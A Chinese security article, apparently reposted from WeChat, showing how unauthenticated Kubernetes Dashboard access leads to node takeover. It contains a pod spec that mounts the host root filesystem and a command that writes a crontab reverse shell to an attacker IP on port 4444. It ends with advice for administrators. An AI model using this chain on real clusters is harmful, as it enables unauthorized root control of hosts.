<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kevH6oTfZA1lwkjvkKQqfA)

文章前言  

K8s Dashboard 是 Kubernetes 的一个 Web UI，它提供了一个用户友好的界面来管理和监控 Kubernetes 集群。它可以让用户通过图形化界面查看 Kubernetes 集群的状态和健康状况、创建、删除和修改资源对象、查看日志和监控数据等。K8s Dashboard 还支持在多个集群之间进行切换，并提供了一些插件和扩展功能来增强其功能，本篇文章我们主要介绍 K8s Dashboard 的利用

#### 漏洞描述

K8s Dashboard 默认是存在鉴权机制的，用户可以通过 kubeconfig 或者 Token 两种方式登录，当用户开启了 enable-skip-login 时可以在登录界面点击 Skip 跳过登录直接进入 Dashboard，而且有时候可以直接访问 K8s DashBoard，在这种情况下攻击者可以通过部署恶意 Pod 实现控制节点的目的

#### 漏洞复现

K8s DashBoard 未授权访问：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmmrfvwoTpEichr1S4x4wQOH5mMJGbDdGhFU2gZHa1KmcTUT8xVyHZll7xaHRQZyYbygDia9kkbFlWA/640?wx_fmt=png)

#### 宿主 Shell

Step 1：通过 WEB UI 界面创建一个 pod，并将本地根目录挂载到 pod 的 / mnt 目录中

```
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmmrfvwoTpEichr1S4x4wQOHdoKlwFmT7AqZoYIYVdbp8umoDJY0AL1UzggS2aIHCVmL0U8L3NlHHw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmmrfvwoTpEichr1S4x4wQOHSSos0iciaibKeuYlCuxUVWRg3QuDYbz0uQRqOtpibqbhlZf9wSehVUIBKw/640?wx_fmt=png)

Step 2：之后可以看到创建的 myapp Pod

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmmrfvwoTpEichr1S4x4wQOHFEtztNcG2KyUdIDsoiaGh9Z4ZqJ7Roz7dIbFxak9E9BWKviaynjcnYhg/640?wx_fmt=png)

Step 3：之后进入挂载的 / mnt 目录中，就是 master 节点的对应目录了

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmmrfvwoTpEichr1S4x4wQOHKMIO9aAEUS4j9gjrgovGCz5zP7YM2GOaoj6libXAMjTpZ45pc8VvBag/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmmrfvwoTpEichr1S4x4wQOHicTAfUKK4SrJuoZ26UkQibhz67Y49P9jkAWvsmW5DIpuW8P1aUuazOxA/640?wx_fmt=png)

Step 4：之后写计划任务

```
echo -e "* * * * * root bash -i >& /dev/tcp/192.168.17.157/4444 0>&1\n" >> /mnt/etc/crontab

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmmrfvwoTpEichr1S4x4wQOHydDqKuVJGicib1yHcd3Hyao518m2aPsfzBUYfEFkZMxdvzaHaaiaE21XA/640?wx_fmt=png)

Step 5：成功反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmmrfvwoTpEichr1S4x4wQOHQ3hHkliaP5SEwtSwtQFfqf4RoOQfpF5ib7vqeicpfKCTFp9ouwOQFN1Gw/640?wx_fmt=png)

**文末小结**  

在本文中，我们介绍了 K8s Dashboard 的作用和功能，以及它在未授权访问的情况下存在的安全风险。我们强调了 Kubernetes 集群管理员需要加强对 K8s Dashboard 的管理和安全控制，以确保不会发生未授权访问的情况。同时，我们也提醒用户在使用 K8s Dashboard 时要注意安全，避免将敏感信息泄露给未经授权的访问者。